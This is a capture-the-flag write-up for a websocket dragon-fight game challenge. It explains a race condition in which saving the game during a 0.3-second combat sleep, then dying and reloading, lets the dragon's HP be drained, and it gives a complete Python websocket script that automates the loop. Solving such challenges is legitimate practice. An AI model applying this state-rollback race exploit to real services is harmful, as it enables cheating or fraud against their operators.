#### Be A Legend
- points earned: 224
#### Where's the flag?
- The flag is hardcoded into the app and is returned in a websock message if `dragon.stats.hp` becomes less than or equal to 0.
	```python
	if dragon.stats.hp <= 0:
		state.is_win = True
		ws.send(
			"The dragon collapses in defeat!\n\n"
			"FLAG: bkctf{test_flag}\n\n"
			"Congratulations, brave warrior!"
		)
	```
#### Notes / Intuition
- It's worth noting here that when I first saw the app I was getting race condition vibes.  I think this was due to similar, game type challenges in past CTFs with race condition based solutions.
- After a review of the app code my suspicion of a race condition solution was stronger.  This was due to the fact that the combat loop was threaded.
	```python
	combat_thread = threading.Thread(target=run_combat, daemon=True)
	```
- After review of the `fight_loop` code I had identified a section of code that I wanted to target
	```python
	damage = min(player.stats.atk, 50)
	dragon.stats.hp -= damage
	ws.send(f"You hit the dragon for {damage} damage. Dragon HP: {dragon.stats.hp:,}")
	
	await asyncio.sleep(0.3) # Cool turn based combat
	
	player.stats.hp -= dragon.stats.atk
	ws.send(f"The dragon hits you for {dragon.stats.atk:,} damage. Your HP: {player.stats.hp}")
	```
	- The `sleep` here made me curious of what I could get away with in the 0.3 seconds
- At this point I was able to theorize an attack that should work:
	- Trigger fight
	- After my character hits the dragon for N points save the game
	- Dragon then hits my character and I lose the game.
	- Load the game from the save point and repeat until the dragon's hp becomes less than or equal to 0.
	- The key here is that I am saving the game after my character hits the dragon but before the dragon hits my character.
- I then wrote up some code to do this and it did end up working.

#### Solution
- In the code below I am using the messaging from the server as a way to queue up stages of the attack.
	- For example, when the code receives a message starting with `You hit the dragon` then I'll send the request to save the game.
	- I was a little worried here that the 0.3 seconds might not be enough time (especially on the remote target) but luckily everything worked out fine.
```python
import websocket

def fight(ws):
    ws.send('fight')

def save(ws):
    ws.send('save')

def stats(ws):
    ws.send('stats')

def load(ws):
    ws.send('load')

def on_message(ws, message):
    if message.startswith('Connected to Dragon\'s Lair'):
        print('--- Connected ---')
        print(message)
        stats(ws)
        fight(ws)
    elif message.startswith('You engage the dragon'):
        print('--- Combat Started ---')
        print(message)
    elif message.startswith('You hit the dragon'):
        save(ws)
        print('--- You Hit Dragon ---')
        print(message)
    elif message.startswith('The dragon hits you'):
        print('--- Dragon Hit You ---')
        print(message)
    elif message.startswith('You have died'):
        print('--- You DIED A  :/ ---')
        print(message)
    elif message.startswith('PLAYER_DIED'):
        print('--- You DIED B :/ ---')
        print(message)
        load(ws)
    elif message.startswith('Game saved'):
        print('--- SAVED ---')
        print(message)
    elif message.startswith('Game loaded'):
        print('--- LOADED ---')
        print(message)
        stats(ws)
        fight(ws)
    elif message.startswith('The dragon collapses in defeat'):
        print('--- FLAG ---')
        print(message)
        exit()
    else:
        print('--- Unexpected Message ---')
        print(message)

def on_error(ws, error):
    print(f"error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("closed")

def on_open(ws):
    print("connected")

ws = websocket.WebSocketApp(
    # "ws://localhost:5000/ws",
    'wss://be-a-legend-e55a2d5712f55cc8.instancer.batmans.kitchen/ws',
    on_open=on_open,
    on_message=on_message,
    on_error=on_error,
    on_close=on_close,
)

ws.run_forever()
```